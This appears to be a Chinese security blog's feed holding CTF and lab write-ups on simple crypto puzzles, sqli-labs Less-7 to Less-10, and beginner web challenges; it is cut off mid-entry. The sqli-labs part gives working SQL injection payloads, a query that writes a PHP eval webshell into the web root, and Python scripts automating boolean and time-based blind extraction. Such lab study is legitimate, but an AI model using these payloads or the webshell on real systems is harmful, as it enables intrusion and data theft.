UNICODE字符集有多个编码方式，分别是UTF-8，UTF-16，UTF-32和UTF-7编码。<br> 好了开始做题，unicode解码<br><img src="http://img-blog.csdnimg.cn/20190728191809260.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 然后再Base64解码<br><img src="http://img-blog.csdnimg.cn/20190728191848409.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 很明显结果是10进制，所以10进制转ASCII<br><img src="http://img-blog.csdnimg.cn/2019072819194494.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 得到flag。</p><h3 id="疑惑的汉字"><a href="#疑惑的汉字" class="headerlink" title="疑惑的汉字"></a>疑惑的汉字</h3><p><img src="http://img-blog.csdnimg.cn/20190728192328881.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>汉字有关的密码？！我想到了当铺密码，了解一下</p><h4 id="当铺密码"><a href="#当铺密码" class="headerlink" title="当铺密码"></a>当铺密码</h4><p>当铺密码就是一种将中文和数字进行转化的密码，算法相当简单:当前汉字有多少笔画出头，就是转化成数字几。<br>所以转化一下<br><img src="http://img-blog.csdnimg.cn/20190728193133532.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后10进制转ASCII<br><img src="http://img-blog.csdnimg.cn/20190728193208419.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag</p><h3 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h3><p>对密码这一块又有了掌握，做题过程中发现好多RSA的题，该总结总结了，继续努力！<br>小白进阶ing。。。。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> 简单加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs攻关2(Less-7_Less-10)</title>
      <link href="/2019/07/19/sqli-labs%E6%94%BB%E5%85%B32(Less-7_Less-10)/"/>
      <url>/2019/07/19/sqli-labs%E6%94%BB%E5%85%B32(Less-7_Less-10)/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前已经通过sqli-libs攻关的方式，总结过SQL注入的简单注入和双注入。所以这次继续通过sqli-libs攻关的方式总结SQL注入的布尔盲注和时间盲注。</p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>在开始盲注前，先把之前未总结的导出文件GET字符型注入学习一下</p><h4 id="一、导出文件-GET注入"><a href="#一、导出文件-GET注入" class="headerlink" title="一、导出文件-GET注入"></a>一、导出文件-GET注入</h4><p><strong>导出文件</strong><br>1、<em>LOAD_FILE</em><br>可以利用该函数，进写入shell<br>用法：select load_file(‘file1’) into outfile ‘file2’<br>将file1的文件导入WEB目录file2的文件中进行访问。<br>2、payload中只能在/home/wwwroot/default/mysql才能写入或者读取文件。因为mysql目录的权限我们设置chowm -R mysql:mysql<br>3、另外要保证正常的文件写入与读取要在mysql配置文件my.cnf最后一行新增secure_file_priv= “/“方法，才能使用LOAD_FILE在生产环境情况下。</p><p><strong>利用</strong><br>导出到文件就是可以将查询结果导出到一个文件中，如常见的将一句话木马导出到一个php文件中，sqlmap中也有导出一句话和一个文件上传的页面。<br>常用的语句是：  <code>select &quot;&lt;?php @eval($_POST[&#39;giantbranch&#39;]);?&gt;&quot; into outfile &quot;XXX\test.php&quot;</code> ，当这里要获取到网站的在系统中的具体路径（绝对路径）<br>获取方法，根据系统和数据库猜测。如winserver的asp默认路径是c:/inetpub/wwwroot/<br>linux的nginx一般是<br><strong>/usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/html</strong>等<br>apache<br><strong>/var/www/htm，/var/www/html/htdocs</strong></p><h5 id="Less-7导出文件GET字符型注入"><a href="#Less-7导出文件GET字符型注入" class="headerlink" title="Less-7导出文件GET字符型注入"></a>Less-7导出文件GET字符型注入</h5><p><strong>1、利用写入新增任意文件</strong><br>payload</p><pre><code class="sql">?id=-1&#39;)) union select 1,2,&#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile &quot;/home/wwwroot/default/mysql/1.txt&quot; --+</code></pre><p><strong>2、验证是否写入成功</strong><br>payload<br><img src="http://img-blog.csdnimg.cn/20190722211855418.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问写入的文件mysql/1.txt<br><img src="http://img-blog.csdnimg.cn/20190722211930221.jpg" alt="在这里插入图片描述"></p><h4 id="二、GET盲注"><a href="#二、GET盲注" class="headerlink" title="二、GET盲注"></a>二、GET盲注</h4><p><strong>布尔盲注</strong><br><em>1.布尔盲注利用前提</em><br>页面没有显示位，没有输出SQL语句执行错误信息，只能通过页面返回正常不正常来判断是否存在注入。<br><em>2.布尔盲注过程</em></p><pre><code class="sql"> (select count(schema_name) from information_schema.sc hemata)&gt; n</code></pre><p>n为数据库个数，当数据库个数大于n页面显示正常</p><pre><code class="sql">(select length(schema_name) from information_schema.s chemata limit 0,1)&gt; n</code></pre><p>该语句判断数据库内第一个数据库名有多少字符，大于n则页面显示正常</p><pre><code class="sql">(select ascii(substr((select schema_name from informa tion_schema.schemata limit 0,1),1,1)))&gt;105</code></pre><p>ascii（）将返回字符串的ascii值。<br>第一个1，表示截取字符串的起始位置。<br>第二个1，表示截取字符串长度<br>语句作用：判断第一个库第一个字符是什么<br><strong>时间盲注</strong><br><em>1.时间盲注利用前提</em><br>页面上没有显示位，也没有输出SQL语句执行错误信息。 正 确的SQL语句和错误的SQL语句返回页面都一样，但是加入sleep(5)条 件之后，页面的返回速度明显慢了5秒。<br><em>2.时间盲注过程</em></p><pre><code class="sql">if((select count(schema_name) from information_schema. schemata)=9,sleep(5),1)</code></pre><p>判断数据库个数</p><pre><code class="sql">if((select length(schema_name) from information_schem a.schemata limit 0,1)=18,sleep(5),1)</code></pre><pre><code class="sql">if((select ascii(substr((select schema_name from info rmation_schema.schemata limit 0,1),1,1)))=105,sleep(5),1)</code></pre><p>判断 第一个库第一个字符<br><strong>相关函数</strong></p><pre><code class="php">Length（）函数 返回字符串的长度substr（）截取字符串ascii（）返回字符的ascii码sleep(n)：将程序挂起一段时间 n为n秒if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</code></pre><p><strong>思路</strong><br>1.先利用length()判断数据库长度<br>2.然后利用if函数、substr函数和ascii函数构造猜测数据库名ascii码的值的语句。</p><h5 id="Less-8布尔型单引号GET盲注"><a href="#Less-8布尔型单引号GET盲注" class="headerlink" title="Less-8布尔型单引号GET盲注"></a>Less-8布尔型单引号GET盲注</h5><p><strong>1、测试</strong><br><em>1.测闭合方式</em><br>输入<code>id=1</code><br>输入<code>id=1&#39;</code><br>输入id=1’–+正常，<br>输入id=1’ and 1=1–+正常，<br>输入id=1’ and 1=2–+不回显，<br>可判定是字符型注入并且为单引号闭合。<br><em>2.测列</em><br>输入<code>id=1&#39; order by 4--+</code><br>不回显，说明有三列。<br><em>3.测长度</em><br>判断数据库名的长度<br>输入<code>id=1&#39; and (length(database())=8)--+</code>正常<br>说明长度为8。<br><em>4.测字符</em><br>用substr()截取字符串的每个字符，ascii()将字符串转换成其ASCII码<br>输入<code>id=1&#39; and (ascii(substr(database(),1,1))&gt;97)--+</code>正常<br><img src="http://img-blog.csdnimg.cn/2019072222004483.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>2、注入</strong><br><em>1.猜库</em><br>第一个字符</p><pre><code class="sql">输入?id=1&#39; and (ascii(substr(database(),1,1))&gt;110)--+正常，输入?id=1&#39; and (ascii(substr(database(),1,1))&gt;116)--+不回显，输入?id=1&#39; and (ascii(substr(database(),1,1))&gt;113)--+正常，输入?id=1&#39; and (ascii(substr(database(),1,1))&gt;114)--+正常，输入?id=1&#39; and (ascii(substr(database(),1,1))&gt;115)--+不回显，</code></pre><p><img src="http://img-blog.csdnimg.cn/20190722220807222.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190722220824955.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>说明数据库名的第一个字符ASCII码为115，即“s”。<br>第二个字符</p><pre><code class="sql">输入?id=1&#39; and (ascii(substr(database(),2,1))&gt;101)--+不回显，输入?id=1&#39; and (ascii(substr(database(),2,1))&gt;100)--+正常，</code></pre><p>说明第二个字符是“e“。以此类推。<br><em>脚本</em></p><pre><code class="python">url = &quot;http://localhost/sqlilabs/Less-8/?id=&quot;start_str = &quot;1&#39; and &quot;info_table_name = &quot;schemata&quot;info_column_name = &quot;schema_name&quot;</code></pre><p><em>2.猜表</em><br>payload</p><pre><code class="sql">?id=1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))&gt;97)--+ 正常</code></pre><p>然后改变大于号后面的数字，查找到第一个字符的ASCII码，<br>再改变substr()函数的第二个参数值获取下一个字符，改变limit子句判断下一个表名。<br><em>脚本</em></p><pre><code class="python">info_table_name = &quot;tables&quot;info_column_name = &quot;table_name&quot;database_name = &quot;security&quot;where_str = &quot; where table_schema=&#39;&quot;+database_name+&quot;&#39;&quot;</code></pre><p><em>3.猜字段</em><br>payload</p><pre><code class="sql">?id=1&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39; limit 0,1),1,1))&gt;97--+</code></pre><p><em>脚本</em></p><pre><code class="python">info_table_name = &quot;columns&quot;info_column_name = &quot;column_name&quot;table_name = &quot;users&quot;where_str = &quot; where table_schema=&#39;&quot;+database_name+&quot;&#39;&quot;+&quot; and table_name=&#39;&quot;+table_name+&quot;&#39;&quot;</code></pre><p><em>4.数据</em><br>payload</p><pre><code class="sql">?id=1&#39; and ascii(substr((select username from security.users limit 0,1),1,1))&gt;65--+</code></pre><p><em>脚本</em></p><pre><code class="python">column_name = [&quot;id&quot;,&quot;username&quot;,&quot;password&quot;]select_str = &quot;select concat_ws(&#39;-&#39;,&quot;+column_name[0]+&quot;,&quot;+column_name[1]+&quot;,&quot;+column_name[2]+&quot;) from &quot;+table_name+&quot; limit &quot;+str(result_index)+&quot;,1&quot;</code></pre><h6 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h6><pre><code class="python"># conding:utf-8import requestsurl_init = &quot;http://localhost/sqli-labs/Less-8/?id=1&quot;;;url_init_error = url_init + &quot;&#39;&quot;length_init = requests.get(url_init).headers.get(&#39;Content-Length&#39;)database=&quot;&quot;# and ascii(substr((select database()),1,1))&gt;64 %23   然后不断增加后面的数字大小来确定#and ascii(substr((select table_name from information_schema.tables where table_schema=hex(int (database))),1,1))&gt;64 %23# 写一个方法二分快速获取应该判断的数字# 返回数字，传入布尔值，对还是错，对应的数字。# 正经的二分查询。有序的字符中，最大最小。65到122# 我们现在知道了返回长度多少是正确的和错误的#def get_length(url):    length = requests.get(url).headers.get(&#39;Content-Length&#39;)    #print(&quot;length:&quot;+str(length))    # 正确的    if (length == length_init):        return True    else:        return Falsedef geturl(n,number):    url = url_init_error+&quot;and ascii(substr((select database()),{0},1))&gt;{1} %23&quot;.format(n,number)    print(url)    return urldef efs(min_number,max_number,n):    if(max_number-min_number==1):        print(&quot;[+] get &quot;+chr(max_number))        global database        database=database+(chr(max_number))        print(&#39;[+] databse is {0}&#39;.format(database))        return    number = int((min_number+max_number)/2)    #print(number)    url = geturl(n,number)    #print(url)    #如果比中间大    if get_length(url):        efs(number,max_number,n)    else:        efs(min_number,number,n)for n in range(1,10):    #如果大于1都不满足就是结束了    if(get_length(geturl(n,1))is False):        break    else:        efs(65,127,n)</code></pre><h5 id="Less-9基于时间的GET单引号盲注"><a href="#Less-9基于时间的GET单引号盲注" class="headerlink" title="Less-9基于时间的GET单引号盲注"></a>Less-9基于时间的GET单引号盲注</h5><p>Time型盲注和Bool型盲注应用场景不同之处在报错的返回上。<br>Less8中，输入合法时会返回正常页面“You are in”，而非法输入时没有返回任何东西。于是可以根据这个特点跑盲注，通过不同的返回页面来判断匹配的字符是否正确。<br>而在Less9中，合法输入与非法输入返回为同一个固定字符串。这样就不能根据页面的回显来判断匹配结果，要使用延时函数sleep()对两种输入进行区分。<br><strong>注意</strong><br>Time盲注时，穷举会比二分查找快很多。Bool盲注时，则二分查找更快一些。<br><strong>1、测试</strong><br>过程同Less8。与Less8相比，用了sleep()函数。<br><strong>2、注入</strong><br>注入过程同Less8。与Less8相比，用了sleep()函数。<br><em>1.猜库</em><br>payload</p><pre><code class="sql">输入?id=1&#39; and if(ascii(substr((select database()),1,1))&gt;114,1,sleep(5))--+正常输入?id=1&#39; and if(ascii(substr((select database()),1,1))&gt;115,1,sleep(5))--+延迟</code></pre><p><img src="http://img-blog.csdnimg.cn/20190722225011402.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190722225025856.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>说明第一个字符是s，然后以此类推得出数据库名。<br><em>2.猜表</em><br>payload</p><pre><code class="sql">输入?id=1&#39; and if((ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))&gt;100),1,sleep(5))--+正常输入?id=1&#39; and if((ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))&gt;101),1,sleep(5))--+延迟</code></pre><p>说明第一个表的第一个字符为“e”。<br><em>3.猜字段</em><br>payload</p><pre><code class="sql">输入?id=1&#39; and if((ascii(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1),1,1))&gt;104),1,sleep(5))--+正常输入?id=1&#39; and if((ascii(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1),1,1))&gt;105),1,sleep(5))--+延迟</code></pre><p>说明第一个字符为“i”。<br><em>4.数据</em><br>payload</p><pre><code class="sql">输入?id=1&#39; and if((ascii(substr((select username from security.users limit 0,1),1,1))&gt;67),1,sleep(5))--+正常输入?id=1&#39; and if((ascii(substr((select username from security.users limit 0,1),1,1))&gt;68),1,sleep(5))--+延迟</code></pre><p>说明第一个字符为“D”。</p><h6 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h6><pre><code class="python">import requestsvalue =&quot;abcdefghigklmnopqrstuvwxyz@_.&quot;data=&quot;&quot;url = &quot;http://localhost:9096/sqli-labs/Less-9/?id=1&#39; and if((substr(({0}),{1},1)=&#39;{2}&#39;),sleep(5),NULL); %23&quot;url_length=&quot;http://localhost:9096/sqli-labs/Less-9/?id=1&#39; and if((length(({0}))={1}),sleep(5),NULL); %23&quot;def get_length(payload):    for n in range(1,100):        url= url_length.format(payload,n)        print(url)        if(get_respone(url)):            print(&quot;[+] length is {0}&quot;.format(n))            return ndef get_data(payload,value,length):    for n in range(1,length):        for v in value :            url_data = url.format(payload,n,v)            print(url_data)            if(get_respone(url_data)):                global data                data=data+v                print(&quot;[+] data is {0}&quot;.format(data))                breakdef get_respone(url):    try:        html = requests.get(url,timeout=4)        return False    except Exception as e:        print(&quot;......&quot;)        return Truedatabse_payload =&quot;select database()&quot;get_data(databse_payload,value,get_length(databse_payload)+1)</code></pre><h5 id="Less-10基于时间的GET双引号盲注"><a href="#Less-10基于时间的GET双引号盲注" class="headerlink" title="Less-10基于时间的GET双引号盲注"></a>Less-10基于时间的GET双引号盲注</h5><p>和Less9差别只在于单双引号，修改查询语句闭合后用脚本注入即可。</p><h3 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h3><p>总结之后，又对盲注有了更深一步的理解。脚本是硬伤，我要继续好好学习python了。<br>小白进阶ing。。。。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场练习 </tag>
            
            <tag> 导出文件注入 </tag>
            
            <tag> GET型盲注 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-Web(新手区)</title>
      <link href="/2019/07/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web(%E6%96%B0%E6%89%8B%E5%8C%BA)/"/>
      <url>/2019/07/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web(%E6%96%B0%E6%89%8B%E5%8C%BA)/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>暑假前，为了学习Web题，做了攻防世界的新手区的Web题，当时没有总结，现在总结一下。</p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="Web1：view-source"><a href="#Web1：view-source" class="headerlink" title="Web1：view_source"></a>Web1：view_source</h4><p><img src="http://img-blog.csdnimg.cn/20190717185021454.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看源代码，右键不可以用。所以按F12，直接查看源码即可。<br><img src="http://img-blog.csdnimg.cn/20190717185234655.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="Web2：get-post"><a href="#Web2：get-post" class="headerlink" title="Web2：get_post"></a>Web2：get_post</h4><p><img src="http://img-blog.csdnimg.cn/2019071718535885.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="HTTP的两种请求方式"><a href="#HTTP的两种请求方式" class="headerlink" title="HTTP的两种请求方式"></a>HTTP的两种请求方式</h5><p><strong>GET</strong><br>GET请求的数据会附在URL之后（就是把数据放置在HTTP协议头中）如：</p><pre><code class="php">/test/1.php?name1=value1&amp;name2=value2</code></pre><p><strong>POST</strong><br>POST请求是把提交的数据放置在HTTP的消息主体中 如：</p><pre><code class="php">POST /test/1.php HTTP/1.1Host: w3schools.comname1=value1&amp;name2=value2</code></pre><p>所以为了方便，直接用火狐进行传参，即可得出flag。<br><img src="http://img-blog.csdnimg.cn/20190717190559826.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="Web3：robots"><a href="#Web3：robots" class="headerlink" title="Web3：robots"></a>Web3：robots</h4><p><img src="http://img-blog.csdnimg.cn/20190717190712914.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="robots协议"><a href="#robots协议" class="headerlink" title="robots协议"></a><a href="http://www.baidu.com/link?url=mhei28ocaDcJjWt0PNDFoHoVElXj7_mHlpSIFy2LWr0VzgcQSjNTFtVmMOSetzdcHNoQTMhvCvAQWUSitr5QTmj8XmVKFFHIOeuhUvr5K57&wd=&eqid=9ed066eb0015a873000000055cc5777c" target="_blank" rel="noopener">robots协议</a></h5><p>robots.txt文件是一个<a href="http://baike.baidu.com/item/%E6%96%87%E6%9C%AC" target="_blank" rel="noopener">文本</a>文件，使用<a href="http://baike.baidu.com/item/%E4%BB%BB%E4%BD%95" target="_blank" rel="noopener">任何</a>一个常见的<a href="http://baike.baidu.com/item/%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91" target="_blank" rel="noopener">文本编辑</a>器，比如<a href="http://baike.baidu.com/item/Windows" target="_blank" rel="noopener">Windows</a>系统自带的Notepad，就可以创建和编辑它[1]  。<a href="http://baike.baidu.com/item/robot" target="_blank" rel="noopener">robot</a>s.txt是一个协议，而不是一个<a href="http://baike.baidu.com/item/%E5%91%BD%E4%BB%A4" target="_blank" rel="noopener">命令</a>。robots.txt是<a href="http://baike.baidu.com/item/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E" target="_blank" rel="noopener">搜索引擎</a>中访问网站的时候要查看的第一个文件。robots.txt文件告诉<a href="http://baike.baidu.com/item/%E8%9C%98%E8%9B%9B%E7%A8%8B%E5%BA%8F" target="_blank" rel="noopener">蜘蛛程序</a>在服务器上什么文件是可以被查看的。</p><p>联想到在URL后加上robots.txt</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvMTU5MzgyNS8yMDE5MDQvMTU5MzgyNS0yMDE5MDQyODE4MDc1MDY3Ni04MTE0MTcwMTAucG5n" alt="img"></p><p>URL后加上f1ag_1s_h3re.php</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvMTU5MzgyNS8yMDE5MDQvMTU5MzgyNS0yMDE5MDQyODE4MDg1MTkzNy0xODc4NzgyOTIyLnBuZw" alt="img"></p><p>在URL后加上robots.txt便得到了flag</p><h4 id="Web4：backup"><a href="#Web4：backup" class="headerlink" title="Web4：backup"></a>Web4：backup</h4><p><img src="http://img-blog.csdnimg.cn/20190717190959249.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/2019071719152556.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不知道。。。百度一下<br>index.php文件的备份文件,在后面加上”.bak”,即index.php.bak<br><img src="http://img-blog.csdnimg.cn/20190717191123333.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190717191627268.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag。</p><h4 id="Web5：cookie"><a href="#Web5：cookie" class="headerlink" title="Web5：cookie"></a>Web5：cookie</h4><p><img src="http://img-blog.csdnimg.cn/20190717191732793.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用Burpsuite抓包<br><img src="http://img-blog.csdnimg.cn/20190717191840793.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>添加url后缀名cookie.php<br><img src="http://img-blog.csdnimg.cn/20190717191933659.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看HTTP响应，即可得出flag<br><img src="http://img-blog.csdnimg.cn/2019071719195671.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="Web6：disabled-button"><a href="#Web6：disabled-button" class="headerlink" title="Web6：disabled_button"></a>Web6：disabled_button</h4><p><img src="http://img-blog.csdnimg.cn/20190717192219799.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看源码<br><img src="http://img-blog.csdnimg.cn/20190717192311190.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现有disabled属性，<strong>disabled属性可设置或返回是否禁用单选按钮</strong>。所以删掉disabled属性<br><img src="http://img-blog.csdnimg.cn/20190717192523409.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>删掉后可以点击了，点击一下，得到flag<br><img src="http://img-blog.csdnimg.cn/20190717192547576.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="Web7：simple-js"><a href="#Web7：simple-js" class="headerlink" title="Web7：simple_js"></a>Web7：simple_js</h4><p><img src="http://img-blog.csdnimg.cn/20190717192746994.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看源码<br><img src="http://img-blog.csdnimg.cn/20190717193832191.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现这个地方比较可疑，像16进制<br><img src="http://img-blog.csdnimg.cn/20190717192804665.jpg" alt="在这里插入图片描述"><br>所以16进制转ASCII<br><img src="http://img-blog.csdnimg.cn/20190717194021177.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>文本好像是ASCII码10进制值，所以10进制转ASCII<br><img src="http://img-blog.csdnimg.cn/20190717194359716.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag</p><h4 id="Web8：xff-referer"><a href="#Web8：xff-referer" class="headerlink" title="Web8：xff_referer"></a>Web8：xff_referer</h4><p><img 